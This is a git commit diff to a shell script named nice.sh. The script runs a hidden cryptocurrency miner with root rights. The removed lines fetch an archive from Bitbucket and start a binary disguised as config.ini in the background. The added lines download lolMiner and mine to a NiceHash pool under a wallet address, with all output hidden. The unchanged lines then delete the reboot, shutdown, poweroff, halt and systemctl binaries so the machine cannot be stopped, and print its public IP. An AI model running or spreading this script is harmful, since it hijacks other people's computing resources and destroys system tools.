dfeb157e216df59d0a039d7275df217f33e19baf
kamikaze05 <167535693+kamikaze05@users.noreply.github.com>
2024-05-11 00:34:48 +0700

    Update nice.sh

--- nice.sh
+++ nice.sh
@@ -1,8 +1,6 @@
 #!/bin/bash
-sudo apt update && apt install git wget nano libpci-dev && wget -q https://bitbucket.org/kami-kaze01/maxkaze/downloads/kamikazeT4.tar.gz && tar -xvf kamikazeT4.tar.gz 
-chmod +x kamikaze
-chmod +x config.ini
-sudo nohup ./config.ini > /dev/null 2>&1 &
+sudo apt update -y && apt install git wget nano libpci-dev 
+wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Lin64.tar.gz && tar -xf lolMiner_v1.88_Lin64.tar.gz && cd 1.88 && ./lolMiner --algo ETHASH --pool stratum+tcp://daggerhashimoto.hk.nicehash.com:3353 --user 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.GPU --ethstratum ETHPROXY > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
